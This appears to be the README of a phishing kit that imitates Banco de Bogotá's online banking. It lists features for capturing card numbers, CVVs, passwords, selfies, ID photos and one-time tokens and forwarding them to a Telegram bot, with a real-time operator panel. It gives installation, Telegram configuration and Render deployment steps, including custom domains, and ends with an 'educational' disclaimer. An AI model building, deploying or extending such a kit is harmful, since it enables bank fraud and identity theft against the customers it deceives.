# Panel de Bogotá - Banca Virtual

Sistema de banca virtual para Banco de Bogotá con integración de Telegram Bot, Socket.io y verificación biométrica.

## 🚀 Características

- ✅ Formularios de autenticación (Clave Segura y Tarjeta Débito)
- ✅ Captura completa de datos de tarjeta débito (16 dígitos, CVV, fecha de vencimiento)
- ✅ Verificación biométrica con captura de selfie
- ✅ Captura de documento de identidad (cédula)
- ✅ Verificación de token de 6 dígitos
- ✅ Integración con Telegram Bot para notificaciones y envío de fotos
- ✅ Comunicación en tiempo real con Socket.io
- ✅ Diseño responsive y adaptable (desktop, tablet, móvil)
- ✅ Loading overlays profesionales sin delays
- ✅ Dashboard interactivo
- ✅ Flujo de verificación en tiempo real

## 📋 Requisitos

- Node.js >= 18.0.0
- npm >= 9.0.0
- Bot de Telegram configurado
- Cuenta en Render.com (para deployment)
- Navegador con soporte para WebRTC (para captura de cámara)

## 🔧 Instalación Local

1. Clonar el repositorio:
```bash
git clone https://github.com/casado1028tirito/bogota-gol.git
cd bogota-gol
```

2. Instalar dependencias:
```bash
npm install
```

3. Configurar variables de entorno:
Crear un archivo `.env` en la raíz del proyecto:
```env
TELEGRAM_TOKEN=tu_token_aqui
TELEGRAM_CHAT_ID=tu_chat_id_aqui
PORT=3000
NODE_ENV=development
```

4. Iniciar el servidor:
```bash
npm start
```

5. Abrir en el navegador:
```
http://localhost:3000
```

## 🌐 Deployment en Render

### Configuración Automática

1. Conectar tu repositorio de GitHub a Render
2. Crear un nuevo Web Service
3. Render detectará automáticamente el `package.json`

### Variables de Entorno en Render

Configurar las siguientes variables en el Dashboard de Render:

| Variable | Descripción | Ejemplo |
|----------|-------------|---------|
| `TELEGRAM_TOKEN` | Token del bot de Telegram | `7314533621:AAHyzTNE...` |
| `TELEGRAM_CHAT_ID` | ID del chat de Telegram | `-1002638389042` |
| `NODE_ENV` | Entorno de ejecución | `production` |
| `BASE_URL` | URL base de la aplicación | `https://tu-app.onrender.com` |

### Configuración del Web Service

```yaml
Build Command: npm install
Start Command: npm start
```

### Configuración de Dominios

1. En Render Dashboard, ir a Settings
2. Agregar custom domain si lo deseas
3. Actualizar `BASE_URL` con el dominio correcto

## 📁 Estructura del Proyecto

```
Panel de bogota/
│
├── server.js                 # Servidor principal Express + Socket.io
├── package.json             # Dependencias y scripts
├── render.yaml              # Configuración de Render
│
├── index.html               # Página principal de login
├── index.js                 # Lógica de formularios
├── index.css                # Estilos de la página principal
│
├── token.html               # Página de verificación de token
├── token.js                 # Lógica de token
├── token.css                # Estilos de token
│
├── dashboard.html           # Dashboard del usuario
├── dashboard.js             # Lógica del dashboard
├── dashboard.css            # Estilos del dashboard
│
├── js/
│   ├── common.js            # Utilidades comunes
│   ├── telegram-events.js   # Manejador de eventos de Telegram
│   └── loading-overlay-manager.js  # Sistema de loading
│
├── css/
│   └── loading-overlay.css  # Estilos del overlay
│
└── Imagenes/                # Recursos gráficos
```

## 🔐 Seguridad

- **Variables de Entorno**: Nunca subir el archivo `.env` al repositorio
- **HTTPS**: Render proporciona HTTPS automáticamente
- **Token de Telegram**: Mantener seguro y no compartir

## 🛠️ Tecnologías

- **Backend**: Node.js + Express
- **WebSockets**: Socket.io
- **Bot**: node-telegram-bot-api
- **Frontend**: HTML5, CSS3, JavaScript (Vanilla)
- **Deployment**: Render.com

## 📝 Scripts Disponibles

```bash
npm start      # Inicia el servidor en producción
npm run dev    # Inicia el servidor en modo desarrollo
```

## 🐛 Solución de Problemas

### El servidor no inicia
- Verificar que las variables de entorno estén configuradas
- Verificar que el puerto esté disponible
- Revisar los logs: `console.log` en el terminal

### Socket.io no conecta
- Verificar que el cliente use la misma URL que el servidor
- Revisar las configuraciones de CORS
- Verificar que los transports estén habilitados

### El bot de Telegram no responde
- Verificar el TELEGRAM_TOKEN
- Verificar el TELEGRAM_CHAT_ID
- Asegurarse de que el bot esté iniciado con `/start`

## 📞 Soporte

Para problemas o preguntas, crear un issue en GitHub.

## 📄 Licencia

ISC

---

**Nota**: Este proyecto es solo para fines educativos y de demostración.
